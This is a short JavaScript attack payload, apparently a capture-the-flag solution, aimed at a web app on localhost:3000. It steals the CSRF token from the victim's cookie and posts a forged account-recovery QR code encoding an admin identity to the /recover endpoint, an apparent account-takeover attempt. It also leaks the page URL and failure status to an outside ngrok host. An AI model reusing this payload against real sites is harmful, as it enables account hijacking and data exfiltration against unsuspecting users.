function dataURItoBlob(dataURI) {
    // convert base64/URLEncoded data component to raw binary data held in a string
    var byteString;
    if (dataURI.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(dataURI.split(',')[1]);
    else
        byteString = unescape(dataURI.split(',')[1]);

    // separate out the mime component
    var mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];

    // write the bytes of the string to a typed array
    var ia = new Uint8Array(byteString.length);
    for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
    }

    return new Blob([ia], {type:mimeString});
}

if (window.location.search === "?x") {
    var d=new FormData();
    d.append("qrcode", dataURItoBlob("data:image/png;base64,NjE2NDZkNjk2ZTQwNmQ3OTY0NmY2MzdhMmU2MzZmNzM2ZDY5NjM6YTk4OTc4YTE3MjY0ZmVjZjAxYTIwOTY5N2UwMzExMmUzNDA1YzMzZTA2YjA0Mzg1NWExMmYzNmNjZGFiODY3ZDZlMzIxYTgyNTViMDMwNWNlYWVhM2FlOThmYTM4Yzk5ODExZTMxMzQyZWEzOWU5OGZkNmVkN2I2MzhjZTI3MmU2YWU2NjBiMDFlYzY1MTYxNjkxOTgzYmU0ZDVkMmQ3ZjNlNTc1MjJhMzAyZjllZDIyZGM2MGM4ZGFlMWE2Yjk1ZTc1OGE1MmVjMmVhZTk4YzRkMGIzZGQxZWVlYjM3NTA0Y2U0MTMwNjZjYzRlMmUzNWU0NzE1MmI3MzVjZWMyYg=="), "qr.png");
    d.append("_csrf_token", document.cookie.split("_csrf_token=")[1]);
    fetch('http://localhost:3000/recover', {method: 'POST', body: d, credentials: 'same-origin'}).then(x => window.location = 'http://localhost:3000/documents').catch(x => window.location = 'http://04e3f05d.ngrok.io/?x=fail-'+x.status);
} else {
  window.location = "http://04e3f05d.ngrok.io/?x="+window.location.href;
}
